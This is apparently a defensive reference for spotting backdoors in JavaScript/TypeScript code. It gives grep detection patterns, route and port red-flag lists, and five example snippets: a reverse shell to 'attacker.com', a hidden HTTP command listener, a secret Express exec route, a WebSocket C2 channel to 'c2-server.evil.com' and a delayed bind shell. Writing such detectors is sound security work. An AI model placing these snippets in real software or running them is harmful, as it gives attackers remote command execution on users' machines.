# Backdoor Detection Patterns

Patterns indicating hidden network endpoints, reverse shells, or undocumented remote access.

## Grep Patterns

```bash
# Reverse shell indicators
grep -rnE "(child_process|execSync|spawnSync|exec)\s*\(" --include="*.ts" --include="*.js" | grep -iE "(bash|sh|cmd|powershell|/bin/|nc |ncat)"

# Hidden HTTP servers
grep -rnE "(net\.createServer|http\.createServer|https\.createServer)" --include="*.ts" --include="*.js"

# WebSocket connections to external hosts
grep -rnE "(new WebSocket|ws://|wss://)" --include="*.ts" --include="*.js"

# Hidden routes (Express/Koa/Fastify)
grep -rnE "\.(get|post|put|delete|all|use)\s*\(\s*['\"]/" --include="*.ts" --include="*.js"

# Port binding on unusual ports
grep -rnE "\.listen\s*\(\s*\d+" --include="*.ts" --include="*.js"

# SSH/Tunnel creation
grep -rnE "(ssh2|tunnel-ssh|node-ssh|ssh-exec)" --include="*.ts" --include="*.js"
```

## Suspicious Patterns

### 1. Reverse Shell

```javascript
// 🔴 CRITICAL — Classic reverse shell
const { exec } = require("child_process");
const net = require("net");
const client = new net.Socket();
client.connect(4444, "attacker.com", () => {
  client.on("data", (data) => {
    exec(data.toString(), (err, stdout, stderr) => {
      client.write(stdout + stderr);
    });
  });
});
```

### 2. Hidden HTTP Server

```javascript
// 🔴 CRITICAL — Backdoor HTTP listener on a secondary port
const http = require("http");
http.createServer((req, res) => {
  if (req.url === "/cmd") {
    const cmd = new URL(req.url, "http://localhost").searchParams.get("c");
    require("child_process").exec(cmd, (e, out) => res.end(out));
  }
}).listen(31337);
```

### 3. Hidden Express Route

```javascript
// 🔴 CRITICAL — Undocumented admin route
app.get("/.__admin__/exec", (req, res) => {
  const result = require("child_process").execSync(req.query.cmd);
  res.send(result.toString());
});
```

### 4. WebSocket Backdoor

```javascript
// 🔴 CRITICAL — WebSocket C2 channel
const ws = new WebSocket("wss://c2-server.evil.com/control");
ws.on("message", (msg) => {
  const result = require("child_process").execSync(msg.toString());
  ws.send(result);
});
```

### 5. Scheduled Backdoor Activation

```javascript
// 🔴 CRITICAL — Delayed backdoor to evade initial scans
setTimeout(() => {
  const net = require("net");
  net.createServer((socket) => {
    socket.on("data", (cmd) => {
      require("child_process").exec(cmd.toString(), (e, out) => socket.write(out));
    });
  }).listen(0); // random port
}, 3600000); // activates after 1 hour
```

## Route Naming Red Flags

Flag routes with names suggesting admin/debug backdoors:

```
/.__admin__  /.__debug__  /.__shell__  /.__exec__
/api/internal/eval  /api/hidden/  /backdoor
/health-check-exec  /debug/run  /admin/cmd
```

## Port Binding Red Flags

Flag `.listen()` calls on ports:
- Not matching the project's documented port
- High-numbered ports (>10000) without explanation
- Port `0` (random port assignment to evade detection)
- Ports commonly used by tools: 4444, 5555, 8888, 31337
